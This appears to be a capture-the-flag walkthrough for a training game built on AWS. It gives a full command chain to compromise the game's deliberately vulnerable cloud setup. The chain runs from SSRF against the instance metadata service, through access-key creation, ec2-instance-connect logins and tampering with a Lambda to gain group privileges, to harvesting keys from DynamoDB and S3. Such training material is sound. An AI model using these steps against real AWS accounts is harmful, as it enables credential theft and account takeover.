# Mission 5 cheat sheet


This mission serves as a much bigger game, with a whole, three-tiered infrastructure. It will take users through a vast range of topics and require a variety of skills on most basic free-tier services.


  * Given: AWS key, AWS secret key
  * Variables: $id


$ `aws configure --profile solus`

Set up the credentials for use. Region is always us-east-1 and json output is recommended.

## As user solus (Tier 1)

## Route 1: EC2 proxy SSRF

$ `aws --profile solus ec2 describe-instances`

List the existing instances. There are quite a number of them, but one has the tag "proxy" and a public IP address. 


$ `curl <public ip of proxy instance>?url=169.254.169.254/latest/meta-data/iam/security-credentials/AWS-secgame-mission5-role-ec2proxy-$id`

The proxy is vulnerable to SSRF (server-side request forgery) and allows us to query the metadata server.


$ `aws configure --profile mission5_ec2`

Configure the obtained credentials. Remember to edit your ~/.aws/credentials file to add the aws_session_token.


$ `aws --profile mission5_ec2 s3 ls`

This allows us to list s3 buckets. Only one of them is available.


$ `aws --profile mission5_ec2 s3 sync s3://aws-secgame-mission5-s3-personal-data-emmyselly-$id .; cat aws_key_reminder.txt`

Sync the contents of the bucket and read the AWS keys.


$ `aws configure --profile emmyselly`

Configure your new profile.


## Route 2: Generate new credentials for the next user

$ `aws --profile solus iam list-users` 

List users. 


$ `aws --profile solus iam create-access-key --user-name emmyselly-$id`

Generate a new access key for user emmyselly. Note that you cannot do it with any other user (it'd be too easy). Be mindful, you can only have two sets of active credentials per user at any given time.


$ `aws configure --profile emmyselly`

Set up the new credentials.


## As user emmyselly (Tier 2)

$ `aws --profile emmyselly ec2 describe-instances`

List instances again. This user likely has better privileges than the last one. One of the instances advertises connection using ec2-instance-connect. We will try using this. Note the instance id and ip as $mail_server_id and $mail_server_ip. Its availability zone is us-east-1a


$ `ssh-keygen -t rsa -f key; chmod 400 key`

Generate a new SSH key. You do not need to set a passphrase, this key is temporary. 


$ `aws --profile emmyselly ec2-instance-connect send-ssh-public-key --instance-id $mail_server_id --instance-os-user ec2-user --availability-zone us-east-1a --ssh-public-key file://key.pub`

Use ec2-instance-connect to send your public key to the instance. If needs be, you can guess the os user, the most common being ec2-user and ubuntu. The public key stays valid for one minute.


$ `ssh -i key ec2-user@$mail_server_ip`

Log in to the mail server and investigate /mail.


$ `cat ernest-viladmin/mailfrom\:\ ernest-viladmin\;\ on\:\ 24_11_20XX.txt; cat ernest-viladmin/mailto\:\ bob-lunder\;\ on\:\ 25_11_20XX.txt; cat 3v1l-m4n4ger/mailfrom\:\ Y\;\ on\:\ 25_11_20XX.txt`

This gives us information on two lambda functions: one to dump logs, one to change privileges of users attempting to shut down the "security hypervisor", an apparent honeypot.


$ `exit`

Leave the mail server.


$ `aws --profile emmyselly lambda list-functions`

List existing lambda functions. We can get the code for one of them.


$ `aws --profile emmyselly lambda get-function --function-name AWS-secgame-mission5-lambda-change-group-$id`

A link is given as output. Open it in a browser and download the .zip file.


$ `unzip <archive file>; cat lambda-change-group.py`

Unzip the archive file, and peer in the program.
The program detects tampering, and switches the user to another group, called "suspects". According to the mails, it will kill your privileges.

NB: The current user is used here. Detecting any user required the use of CloudTrail trails, which is outside the scope of free tier. As such, realism here was traded here in order to ensure the free tier was not exceeded.


$ `aws --profile emmyselly iam list-groups`

List the existing groups. An interesting group appears to be privileged-$id.


$ `vim lambda-change-group.py; zip lambda.zip lambda-change-group.py`

Edit the function to swap out the group name, and zip the function again


$ `aws --profile emmyselly lambda update-function-code --function-name AWS-secgame-mission5-lambda-change-group-$id --zip-file fileb://lambda.zip`

Load the new function code in the lambda. The code is triggered when someone attempts to shut down the security hypervisor. Let us trigger the code.


$ `aws --profile emmyselly ec2 stop-instances --instance-id <security hypervisor id>`

Stop the instance to trigger the lambda function. It is also allowed to terminate it.


$ `aws --profile emmyselly iam list-groups-for-user --user-name emmyselly-$id`

List your groups. Notice you are now in the privileged group.


## The dynamo database (Tier 3)

$ `aws --profile emmyselly ec2 describe-instances`

It is time to investigate the "dynamo-handler" instance. Note its id and ip as $ddb_handler_id and $ddb_handler_ip.

## Route 1: Investigate the lambda logs

$ `aws --profile emmyselly ec2 stop-instances --instance-id $dynamo_handler_id`

Stop the dynamo handler instance. Notice it comes back up immediately. As specified in the mail, this will generate logs.


$ `aws --profile emmyselly logs describe-log-groups`

List the log groups and notice there is one for "lambda-dump-logs".


$ `aws --profile emmyselly logs describe-log-streams --log-group-name <lambda-dump-logs log group>`

List the log streams and note the log stream name. **CAUTION**, you will have to escape the "$LATEST" when calling the name in the command-line interface. Write "\$LATEST" to do this.


$ `aws --profile secgame_test logs get-log-events --log-group-name <lambda-dump-logs log group> --log-stream-name <lambda-dump-logs latest log stream>`

List the log events. Notice the username and password in the logs...


$ `ssh ec2-user@$dynamo_handler_ip`

Use the password foobarbazevil to log in to the dynamo handler. Be careful that restarting the instance will have changed its public ip.


## Route 2: Use ec2-instance-connect

$ `aws --profile emmyselly ec2-instance-connect send-ssh-public-key --instance-id $dynamo_handler_id --instance-os-user ec2-user --availability-zone us-east-1a --ssh-public-key file://key.pub`

Use ec2-instance-connect to send your public key to the instance, since the privileged group allows ec2-instance-connect. If needs be, you can guess the os user, the most common being ec2-user and ubuntu.


$ `ssh -i key ec2-user@$dynamo_handler_ip`

Log in to the dynamo handler.

## Once you are logged in the dynamo handler

$ `aws --region us-east-1 dynamodb list-tables`

List the existing tables and notice there is one table called "AWSkeys-$id"


$ `aws --region us-east-1 dynamodb scan --table-name AWSkeys-$id`

Scan the table. AWS keys are found there.


$ `exit`

Leave the dynamo handler.


$ `aws configure --profile hades`

Configure the new credentials.


$ `aws --profile hades iam list-user-policies --user-name hades-$id`

List existig user policies


$ `aws --profile hades iam get-user-policy --user-name hades-$id --policy-name hades-policy-$id`

Display the policy. Notice you are administrator!


$ `aws --profile hades s3 ls; aws --profile hades s3 sync s3://aws-secgame-mission5-super-secret-utlimate-s3-$id ./final-bucket; cd final-bucket`

Find the last bucket and download its contents.


$ `cat .hey_there_hacker.txt`

You win! Congratulations!